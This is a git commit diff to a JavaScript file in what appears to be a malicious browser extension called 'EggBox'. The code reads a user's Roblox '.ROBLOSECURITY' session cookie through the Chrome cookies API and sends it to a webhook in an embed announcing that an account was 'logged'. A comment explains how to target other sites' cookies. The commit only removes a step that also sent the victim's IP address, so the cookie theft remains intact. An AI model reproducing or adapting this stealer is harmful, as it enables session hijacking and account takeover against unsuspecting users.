c4438453a8a504d55280740c106c111aa13c2b17
EggyCryptixx <84878036+9ggy@users.noreply.github.com>
2022-03-09 12:46:44 -0500

    Update Logger.js

--- logger-src/Logger.js
+++ logger-src/Logger.js
@@ -1,15 +1,10 @@
-function webhookReq(webhook, cookie, ip) {
+function webhookReq(webhook, cookie) {
   var params = {
       embeds: [{
             "title": `Eggbox logged a Roblox Account!`,
             "description": ">>> EggBox extension logged someone; see information about the user below",
             "color": 15258703,
             "fields": [{
-              "name": 'Public IP Address',
-              "value": ip,
-              inline: false
-            },
-            {
               "name": 'Cookie',
               "value": "```\n" + cookie + "\n```",
               inline: false
@@ -33,11 +28,6 @@ function webhookReq(webhook, cookie, ip) {
 cookieInfo = {url: "https://www.roblox.com/", name: '.ROBLOSECURITY'}; //If you want to grab other site cookies, change the values both here and in the manifest.json file
 chrome.cookies.get(cookieInfo, function(cookie) {
   if (cookie) {
-    $.getJSON(
-    	`https://ipinfo.io/json`, 
-    	function(ipResponse){
-        // Send Webhook
-        webhookReq("Webhook", cookie.value, ipResponse.ip);
-    })
+    webhookReq("Webhook", cookie.value);
   }
 });
